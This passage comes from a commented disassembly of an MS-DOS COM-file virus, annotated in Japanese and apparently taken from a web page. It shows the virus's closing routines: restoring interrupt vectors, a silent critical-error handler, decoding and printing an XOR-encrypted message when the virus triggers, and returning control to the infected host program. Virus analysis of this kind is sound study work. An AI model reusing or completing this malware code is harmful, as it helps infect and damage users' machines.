	MOV    AX,[DI+00251H]                           ;8B 85 51 02 	..Q.
	MOV    ES:[BX],AX                               ;26 89 07 	&..
	MOV    AX,[DI+00253H]                           ;8B 85 53 02 	..S.
	MOV    ES:[BX+2],AX                             ;26 89 47 02 	&.G.
	MOV    AX,CS                                    ;8C C8 	..
	MOV    ES,AX                                    ;8E C0 	..
	STI                     ;(ﾊﾞｸﾞ:DTAｱﾄﾞﾚｽが復旧されていない);FB 	.
P_0023C:JMP    SHORT B_00255  	;JMP 0100Hへ            ;EB 17 	..
	NOP                                             ;90 	.
;------------------------------------------------------------------------------
;	INT_24H	書込処理中のＩＮＴ２４Ｈ割込処理
;------------------------------------------------------------------------------
INT_24H:XOR    AH,AH   	;ＩＮＴ２４Ｈ処理　メッセージ出さず帰す	;32 E4 	2.
	IRET            ;（致命的エラー割込）        		;CF 	.
;------------------------------------------------------------------------------
;	P_00242	発病時の「暗号文字解除」＋「文字列表示ルーチン」
;------------------------------------------------------------------------------
P_00242:MOV    DL,[SI]  ;データのｱﾄﾞﾚｽから１文字取得    ;8A 14 	..
	INC    SI                                       ;46 	F
	XOR    DL,0FEH 	;文字列の暗号を解除             ;80 F2 FE 	...
	JE     P_00250  ;(表示文字列の終わり DL=000H)   ;74 06 	t.
	MOV    AH,006H                                  ;B4 06 	..
	INT    21H     	;^Cを受け付けない１文字(DL)表示 ;CD 21 	.!
	JMP    SHORT P_00242                            ;EB F2 	..
P_00250:RETN         	                                ;C3 	.
;---------------------------------
D_00251:DW	004DAH        	;INT24Hﾍﾞｸﾀｱﾄﾞﾚｽ保存位置;DA 04 	..
D_00253:DW	00DC3H                                  ;C3 0D 	..
;------------------------------------------------------------------------------
;	D_00255	ウイルス処理終了＝感染アプリケーションの先頭へ
;------------------------------------------------------------------------------
B_00255:DB	0E9H         	;JMP	0100H           	;E9 	.
D_00256:DW	0F1F0H          ;オリジナルファイルの先頭へ  	;F0 F1 	..
;------------------------------------------------------------------------------

</textarea></td></tr></table></body></html>
